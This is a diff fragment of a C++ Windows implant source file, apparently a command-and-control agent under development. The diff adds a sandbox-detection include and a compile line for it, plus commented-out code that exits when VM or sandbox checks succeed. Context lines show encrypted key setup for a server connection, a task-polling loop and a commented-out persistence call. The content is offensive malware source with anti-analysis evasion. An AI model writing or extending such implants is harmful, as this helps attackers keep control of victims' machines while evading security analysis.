@@ -12,8 +12,12 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 
 #include "persist.h"
 #include "parse.h"
+#include "Feiyu/sandbox_detection.h"
 
 // current compile line is - g++ implant.cpp persist.cpp parse.cpp -lwinhttp -lbcrypt -static -o implant.exe
+
+// I think this is putting in the sandbox_detection
+// g++ implant.cpp persist.cpp parse.cpp Feiyu/sandbox_detection.cpp -lwinhttp -lbcrypt -static -o implant.exe
 
 #define SERVERNAME "placeholder"
 #define SLEEP 60000
@@ -242,11 +246,21 @@ void runLoop(int implant_id)
     int i=0;
     BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)serverpublickey,(ULONG)562);
     BCRYPT_KEY_HANDLE symkey=newsymkey(rsakey);
+
+    
     //char* encbuffer=rsaEncrypt(rsakey,);
     //register()
+
     //PERSISTANCE ONCE IMPLANT HAS BEEN MADE
     // PREFERABLY DO NOT TEST THIS ON YOUR MACHINE
     //persist_execution();
+
+    //THIS IS FOR SANDBOX DETECTION TO RUN ONCE
+    // WE NEED ONE IMPLANT COMPILE WITH THIS AND ONE IMPLANT COMPILE WITHOUT IT
+    // 	struct stat buffer;
+    // 	if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
+    // 		MessageBoxW(NULL, L"Running in vm", L"Not good", MB_OK | MB_ICONERROR);
+    // 		exit(0);
     while (true)
     {
         try
